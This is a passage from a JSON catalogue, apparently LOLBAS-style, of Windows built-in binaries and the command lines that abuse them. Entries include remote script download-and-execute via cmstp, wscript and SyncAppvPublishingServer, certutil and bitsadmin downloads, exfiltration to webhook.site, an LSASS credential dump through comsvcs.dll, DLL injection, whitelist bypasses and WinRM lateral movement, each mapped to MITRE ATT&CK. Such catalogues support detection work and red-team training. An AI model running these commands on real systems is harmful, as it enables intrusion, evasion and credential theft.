"cmd_desc": "Installs or removes a Connection Manager service profile.", "function": "execute", "data": [{"Command": "cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf", "Description": "Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.", "Usecase": "Execute code hidden within an inf file. Download and run scriptlets from internet.", "Category": "Execute", "Privileges": "User", "MitreID": "T1191", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1191", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1064": {"platform": "windows", "cmd": "Cmstp.exe", "cmd_alias": "Cmstp", "cmd_desc": "Installs or removes a Connection Manager service profile.", "function": "awl-bypass", "data": [{"Command": "cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf", "Description": "Silently installs a specially formatted remote .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.", "Usecase": "Execute code hidden within an inf file. Execute code directly from Internet.", "Category": "AwL bypass", "Privileges": "User", "MitreID": "T1191", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1191", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1065": {"platform": "windows", "cmd": "Certutil.exe", "cmd_alias": "Certutil", "cmd_desc": "Windows binary used for handeling certificates", "function": "download", "data": [{"Command": "certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe", "Description": "Download and save 7zip to disk in the current folder.", "Usecase": "Download file from Internet", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "certutil.exe -verifyctl -f -split http://7-zip.org/a/7z1604-x64.exe 7zip.exe", "Description": "Download and save 7zip to disk in the current folder.", "Usecase": "Download file from Internet", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1066": {"platform": "windows", "cmd": "Certutil.exe", "cmd_alias": "Certutil", "cmd_desc": "Windows binary used for handeling certificates", "function": "ads", "data": [{"Command": "certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt", "Description": "Download and save a PS1 file to an Alternate Data Stream (ADS).", "Usecase": "Download file from Internet and save it in an NTFS Alternate Data Stream", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/techniques/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1067": {"platform": "windows", "cmd": "Certutil.exe", "cmd_alias": "Certutil", "cmd_desc": "Windows binary used for handeling certificates", "function": "encode", "data": [{"Command": "certutil -encode inputFileName encodedOutputFileName", "Description": "Command to encode a file using Base64", "Usecase": "Encode files to evade defensive measures", "Category": "Encode", "Privileges": "User", "MitreID": "T1027", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1027", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1068": {"platform": "windows", "cmd": "Certutil.exe", "cmd_alias": "Certutil", "cmd_desc": "Windows binary used for handeling certificates", "function": "decode", "data": [{"Command": "certutil -decode encodedInputFileName decodedOutputFileName", "Description": "Command to decode a Base64 encoded file.", "Usecase": "Decode files to evade defensive measures", "Category": "Decode", "Privileges": "User", "MitreID": "T1140", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1140", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "certutil --decodehex encoded_hexadecimal_InputFileName", "Description": "Command to decode a hexadecimal-encoded file decodedOutputFileName", "Usecase": "Decode files to evade defensive measures", "Category": "Decode", "Privileges": "User", "MitreID": "T1140", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1140", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1069": {"platform": "windows", "cmd": "Bitsadmin.exe", "cmd_alias": "Bitsadmin", "cmd_desc": "Used for managing background intelligent transfer", "function": "ads", "data": [{"Command": "bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1", "Description": "Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.", "Usecase": "Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1070": {"platform": "windows", "cmd": "Bitsadmin.exe", "cmd_alias": "Bitsadmin", "cmd_desc": "Used for managing background intelligent transfer", "function": "download", "data": [{"Command": "bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1", "Description": "Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.", "Usecase": "Download file from Internet", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1071": {"platform": "windows", "cmd": "Bitsadmin.exe", "cmd_alias": "Bitsadmin", "cmd_desc": "Used for managing background intelligent transfer", "function": "copy", "data": [{"Command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset", "Description": "Command for copying cmd.exe to another folder", "Usecase": "Copy file", "Category": "Copy", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1072": {"platform": "windows", "cmd": "Bitsadmin.exe", "cmd_alias": "Bitsadmin", "cmd_desc": "Used for managing background intelligent transfer", "function": "execute", "data": [{"Command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset", "Description": "One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.", "Usecase": "Execute binary file specified. Can be used as a defensive evasion.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1073": {"platform": "windows", "cmd": "Wscript.exe", "cmd_alias": "Wscript", "cmd_desc": "Used by Windows to execute scripts", "function": "ads", "data": [{"Command": "wscript c:\\ads\\file.txt:script.vbs", "Description": "Execute script stored in an alternate data stream", "Usecase": "Execute hidden code to evade defensive counter measures", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "echo GetObject(\"script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js\") > %temp%\\test.txt:hi.js && wscript.exe %temp%\\test.txt:hi.js", "Description": "Download and execute script stored in an alternate data stream", "Usecase": "Execute hidden code to evade defensive counter measures", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1074": {"platform": "windows", "cmd": "Mavinject.exe", "cmd_alias": "Mavinject", "cmd_desc": "Used by App-v in Windows", "function": "execute", "data": [{"Command": "MavInject.exe 3110 /INJECTRUNNING c:\\folder\\evil.dll", "Description": "Inject evil.dll into a process with PID 3110.", "Usecase": "Inject dll file into running process", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1075": {"platform": "windows", "cmd": "Mavinject.exe", "cmd_alias": "Mavinject", "cmd_desc": "Used by App-v in Windows", "function": "ads", "data": [{"Command": "Mavinject.exe 4172 /INJECTRUNNING \"c:\\ads\\file.txt:file.dll\"", "Description": "Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172", "Usecase": "Inject dll file into running process", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1076": {"platform": "windows", "cmd": "DataSvcUtil.exe", "cmd_alias": "DataSvcUtil", "cmd_desc": "DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.", "function": "upload", "data": [{"Command": "DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile", "Description": "Upload file, credentials or data exfiltration in general", "Usecase": "Upload file", "Category": "Upload", "Privileges": "User", "MitreID": "T1567", "MitreLink": "https://attack.mitre.org/techniques/T1567/", "OperatingSystem": "Windows 10"}]}, "1077": {"platform": "windows", "cmd": "Cmdkey.exe", "cmd_alias": "Cmdkey", "cmd_desc": "creates, lists, and deletes stored user names and passwords or credentials.", "function": "credentials", "data": [{"Command": "cmdkey /list", "Description": "List cached credentials", "Usecase": "Get credential information from host", "Category": "Credentials", "Privileges": "User", "MitreID": "T1078", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1078", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1078": {"platform": "windows", "cmd": "wuauclt.exe", "cmd_alias": "wuauclt", "cmd_desc": "Windows Update Client", "function": "execute", "data": [{"Command": "wuauclt.exe /UpdateDeploymentProvider <Full_Path_To_DLL> /RunHandlerComServer", "Description": "Full_Path_To_DLL would be the abosolute path to .DLL file and would execute code on attach.", "Usecase": "Execute dll via attach/detach methods", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows 10"}]}, "1079": {"platform": "windows", "cmd": "Control.exe", "cmd_alias": "Control", "cmd_desc": "Binary used to launch controlpanel items in Windows", "function": "ads", "data": [{"Command": "control.exe c:\\windows\\tasks\\file.txt:evil.dll", "Description": "Execute evil.dll which is stored in an Alternate Data Stream (ADS).", "Usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism", "Category": "ADS", "Privileges": "User", "MitreID": "T1196", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1196", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1080": {"platform": "windows", "cmd": "Pnputil.exe", "cmd_alias": "Pnputil", "cmd_desc": "used for Install drivers.", "function": "execute", "data": [{"Command": "pnputil.exe -i -a C:\\Users\\hai\\Desktop\\mo.inf", "Description": "used for Install drivers", "Usecase": "add malicious driver.", "Category": "Execute", "Privileges": "Administrator", "MitreID": "T1215", "MitreLink": "https://attack.mitre.org/techniques/T1215", "OperatingSystem": "Windows 10,7"}]}, "1081": {"platform": "windows", "cmd": "AppInstaller.exe", "cmd_alias": "AppInstaller", "cmd_desc": "Tool used for installation of AppX/MSIX applications on Windows 10", "function": "download", "data": [{"Command": "start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw", "Description": "AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\\Users\\%username%\\AppData\\Local\\Packages\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\\AC\\INetCache\\<RANDOM-8-CHAR-DIRECTORY>", "Usecase": "Download file from Internet", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows 10"}]}, "1082": {"platform": "windows", "cmd": "Ieaframe.dll", "cmd_alias": "Ieaframe", "cmd_desc": "Internet Browser DLL for translating HTML code.", "function": "execute", "data": [{"Command": "rundll32.exe ieframe.dll,OpenURL \"C:\\test\\calc.url\"", "Description": "Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.", "UseCase": "Load an executable payload by calling a .url file with or without quotes.  The .url file extension can be renamed.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}]}, "1083": {"platform": "windows", "cmd": "Pcwutl.dll", "cmd_alias": "Pcwutl", "cmd_desc": "Microsoft HTML Viewer", "function": "execute", "data": [{"Command": "rundll32.exe pcwutl.dll,LaunchApplication calc.exe", "Description": "Launch executable by calling the LaunchApplication function.", "UseCase": "Launch an executable.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}]}, "1084": {"platform": "windows", "cmd": "Zipfldr.dll", "cmd_alias": "Zipfldr", "cmd_desc": "Compressed Folder library", "function": "execute", "data": [{"Command": "rundll32.exe zipfldr.dll,RouteTheCall calc.exe", "Description": "Launch an executable payload by calling RouteTheCall.", "UseCase": "Launch an executable.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}, {"Command": "rundll32.exe zipfldr.dll,RouteTheCall file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "Description": "Launch an executable payload by calling RouteTheCall (obfuscated).", "UseCase": "Launch an executable.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}]}, "1085": {"platform": "windows", "cmd": "Advpack.dll", "cmd_alias": "Advpack", "cmd_desc": "Utility for installing software and drivers with rundll32.exe", "function": "awl-bypass", "data": [{"Command": "rundll32.exe advpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,", "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).", "UseCase": "Run local or remote script(let) code through INF file specification.", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}, {"Command": "rundll32.exe advpack.dll,LaunchINFSection c:\\test.inf,,1,", "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).", "UseCase": "Run local or remote script(let) code through INF file specification.", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}]}, "1086": {"platform": "windows", "cmd": "Advpack.dll", "cmd_alias": "Advpack", "cmd_desc": "Utility for installing software and drivers with rundll32.exe", "function": "execute", "data": [{"Command": "rundll32.exe advpack.dll,RegisterOCX test.dll", "Description": "Launch a DLL payload by calling the RegisterOCX function.", "UseCase": "Load a DLL payload.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}, {"Command": "rundll32.exe advpack.dll,RegisterOCX calc.exe", "Description": "Launch an executable by calling the RegisterOCX function.", "UseCase": "Run an executable payload.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085"}, {"Command": "rundll32 advpack.dll, RegisterOCX \"cmd.exe /c calc.exe\"", "Description": "Launch command line by calling the RegisterOCX function.", "UseCase": "Run an executable payload.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085"}]}, "1087": {"platform": "windows", "cmd": "Shell32.dll", "cmd_alias": "Shell32", "cmd_desc": "Windows Shell Common Dll", "function": "execute", "data": [{"Command": "rundll32.exe shell32.dll,Control_RunDLL payload.dll", "Description": "Launch a DLL payload by calling the Control_RunDLL function.", "UseCase": "Load a DLL payload.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}, {"Command": "rundll32.exe shell32.dll,ShellExec_RunDLL beacon.exe", "Description": "Launch an executable by calling the ShellExec_RunDLL function.", "UseCase": "Run an executable payload.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085"}, {"Command": "rundll32 SHELL32.DLL,ShellExec_RunDLL \"cmd.exe\" \"/c echo hi\"", "Description": "Launch command line by calling the ShellExec_RunDLL function.", "UseCase": "Run an executable payload.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085"}]}, "1088": {"platform": "windows", "cmd": "Syssetup.dll", "cmd_alias": "Syssetup", "cmd_desc": "Windows NT System Setup", "function": "awl-bypass", "data": [{"Command": "rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\\test\\shady.inf", "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).", "UseCase": "Run local or remote script(let) code through INF file specification (Note May pop an error window).", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1085", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}]}, "1089": {"platform": "windows", "cmd": "Syssetup.dll", "cmd_alias": "Syssetup", "cmd_desc": "Windows NT System Setup", "function": "execute", "data": [{"Command": "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\\temp\\something.inf", "Description": "Launch an executable file via the SetupInfObjectInstallAction function and .inf file section directive.", "UseCase": "Load an executable payload.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}]}, "1090": {"platform": "windows", "cmd": "Url.dll", "cmd_alias": "Url", "cmd_desc": "Internet Shortcut Shell Extension DLL.", "function": "execute", "data": [{"Command": "rundll32.exe url.dll,OpenURL \"C:\\test\\calc.hta\"", "Description": "Launch a HTML application payload by calling OpenURL.", "UseCase": "Invoke an HTML Application via mshta.exe (Default Handler).", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}, {"Command": "rundll32.exe url.dll,OpenURL \"C:\\test\\calc.url\"", "Description": "Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.", "UseCase": "Load an executable payload by calling a .url file with or without quotes.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}, {"Command": "rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "Description": "Launch an executable by calling OpenURL.", "UseCase": "Load an executable payload by specifying the file protocol handler (obfuscated).", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}, {"Command": "rundll32.exe url.dll,FileProtocolHandler calc.exe", "Description": "Launch an executable by calling FileProtocolHandler.", "UseCase": "Launch an executable.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}, {"Command": "rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "Description": "Launch an executable by calling FileProtocolHandler.", "UseCase": "Load an executable payload by specifying the file protocol handler (obfuscated).", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}, {"Command": "rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta", "Description": "Launch a HTML application payload by calling FileProtocolHandler.", "UseCase": "Invoke an HTML Application via mshta.exe (Default Handler).", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}]}, "1091": {"platform": "windows", "cmd": "Comsvcs.dll", "cmd_alias": "Comsvcs", "cmd_desc": "COM+ Services", "function": "dump", "data": [{"Command": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump \"[LSASS_PID] dump.bin full\"", "Description": "Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.", "Usecase": "Dump Lsass.exe process memory to retrieve credentials.", "Category": "Dump", "Privileges": "SYSTEM", "MitreID": "T1003", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003", "OperatingSystem": "Windows"}]}, "1092": {"platform": "windows", "cmd": "Mshtml.dll", "cmd_alias": "Mshtml", "cmd_desc": "Microsoft HTML Viewer", "function": "execute", "data": [{"Command": "rundll32.exe Mshtml.dll,PrintHTML \"C:\\temp\\calc.hta\"", "Description": "Invoke an HTML Application via mshta.exe (Note - Pops a security warning and a print dialogue box).", "UseCase": "Launch an HTA application.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}]}, "1093": {"platform": "windows", "cmd": "Shdocvw.dll", "cmd_alias": "Shdocvw", "cmd_desc": "Shell Doc Object and Control Library.", "function": "execute", "data": [{"Command": "rundll32.exe shdocvw.dll,OpenURL \"C:\\test\\calc.url\"", "Description": "Launch an executable payload via proxy through a(n) URL (information) file by calling OpenURL.", "UseCase": "Load an executable payload by calling a .url file with or without quotes.  The .url file extension can be renamed.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}]}, "1094": {"platform": "windows", "cmd": "Setupapi.dll", "cmd_alias": "Setupapi", "cmd_desc": "Windows Setup Application Programming Interface", "function": "awl-bypass", "data": [{"Command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\Tools\\shady.inf", "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).", "UseCase": "Run local or remote script(let) code through INF file specification.", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1085", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}]}, "1095": {"platform": "windows", "cmd": "Setupapi.dll", "cmd_alias": "Setupapi", "cmd_desc": "Windows Setup Application Programming Interface", "function": "execute", "data": [{"Command": "rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\\\Tools\\\\calc_exe.inf", "Description": "Launch an executable file via the InstallHinfSection function and .inf file section directive.", "UseCase": "Load an executable payload.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}]}, "1096": {"platform": "windows", "cmd": "Ieadvpack.dll", "cmd_alias": "Ieadvpack", "cmd_desc": "INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.", "function": "awl-bypass", "data": [{"Command": "rundll32.exe ieadvpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,", "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).", "UseCase": "Run local or remote script(let) code through INF file specification.", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}, {"Command": "rundll32.exe ieadvpack.dll,LaunchINFSection c:\\test.inf,,1,", "Description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (DefaultInstall section implied).", "UseCase": "Run local or remote script(let) code through INF file specification.", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}]}, "1097": {"platform": "windows", "cmd": "Ieadvpack.dll", "cmd_alias": "Ieadvpack", "cmd_desc": "INF installer for Internet Explorer. Has much of the same functionality as advpack.dll.", "function": "execute", "data": [{"Command": "rundll32.exe ieadvpack.dll,RegisterOCX test.dll", "Description": "Launch a DLL payload by calling the RegisterOCX function.", "UseCase": "Load a DLL payload.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085", "OperatingSystem": "Windows"}, {"Command": "rundll32.exe ieadvpack.dll,RegisterOCX calc.exe", "Description": "Launch an executable by calling the RegisterOCX function.", "UseCase": "Run an executable payload.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085"}, {"Command": "rundll32 ieadvpack.dll, RegisterOCX \"cmd.exe /c calc.exe\"", "Description": "Launch command line by calling the RegisterOCX function.", "UseCase": "Run an executable payload.", "Category": "Execute", "Privileges": "User", "MitreID": "T1085", "MItreLink": "https://attack.mitre.org/wiki/Technique/T1085"}]}, "1098": {"platform": "windows", "cmd": "Pester.bat", "cmd_alias": "Pester", "cmd_desc": "Used as part of the Powershell pester", "function": "execute", "data": [{"Command": "Pester.bat [/help|?|-?|/?] \"$null; notepad\"", "Description": "Execute code using Pester. The third parameter can be anything. The fourth is the payload. Example here executes notepad", "Usecase": "Proxy execution", "Category": "Execute", "Privileges": "User", "MitreID": "T1216", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216", "OperatingSystem": "Windows 10"}]}, "1099": {"platform": "windows", "cmd": "Manage-bde.wsf", "cmd_alias": "Manage-bde", "cmd_desc": "Script for managing BitLocker", "function": "execute", "data": [{"Command": "set comspec=c:\\windows\\system32\\calc.exe & cscript c:\\windows\\system32\\manage-bde.wsf", "Description": "Set the comspec variable to another executable prior to calling manage-bde.wsf for execution.", "Usecase": "Proxy execution from script", "Category": "Execute", "Privileges": "User", "MitreID": "T1216", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216", "OperatingSystem": "Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "copy c:\\users\\person\\evil.exe c:\\users\\public\\manage-bde.exe & cd c:\\users\\public\\ & cscript.exe c:\\windows\\system32\\manage-bde.wsf", "Description": "Run the manage-bde.wsf script with a payload named manage-bde.exe in the same directory to run the payload file.", "Usecase": "Proxy execution from script", "Category": "Execute", "Privileges": "User", "MitreID": "T1216", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216", "OperatingSystem": "Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1100": {"platform": "windows", "cmd": "Pubprn.vbs", "cmd_alias": "Pubprn", "cmd_desc": null, "function": "execute", "data": [{"Command": "pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct", "Description": "Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection", "Usecase": "Proxy execution", "Category": "Execute", "Privileges": "User", "MitreID": "T1216", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216", "OperatingSystem": "Windows 10"}]}, "1101": {"platform": "windows", "cmd": "Syncappvpublishingserver.vbs", "cmd_alias": "Syncappvpublishingserver", "cmd_desc": "Script used related to app-v and publishing server", "function": "execute", "data": [{"Command": "SyncAppvPublishingServer.vbs \"n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX\"", "Description": "Inject PowerShell script code with the provided arguments", "Usecase": "Use Powershell host invoked from vbs script", "Category": "Execute", "Privileges": "User", "MitreID": "T1216", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216", "OperatingSystem": "Windows 10"}]}, "1102": {"platform": "windows", "cmd": "winrm.vbs", "cmd_alias": "winrm", "cmd_desc": "Script used for manage Windows RM settings", "function": "execute", "data": [{"Command": "winrm invoke Create wmicimv2/Win32_Process @{CommandLine=\"notepad.exe\"} -r:http://target:5985", "Description": "Lateral movement/Remote Command Execution via WMI Win32_Process class over the WinRM protocol", "Usecase": "Proxy execution", "Category": "Execute", "Privileges": "User", "MitreID": "T1216", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216", "OperatingSystem": "Windows 10"}, {"Command": "winrm invoke Create wmicimv2/Win32_Service @{Name=\"Evil\";DisplayName=\"Evil\";PathName=\"cmd.exe /k c:\\windows\\system32\\notepad.exe\"} -r:http://acmedc:5985   \\nwinrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985", "Description": "Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol", "Usecase": "Proxy execution", "Category": "Execute", "Privileges": "User", "MitreID": "T1216", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216", "OperatingSystem": "Windows 10"}]}, "1103": {"platform": "windows", "cmd": "winrm.vbs", "cmd_alias": "winrm", "cmd_desc": "Script used for manage Windows RM settings", 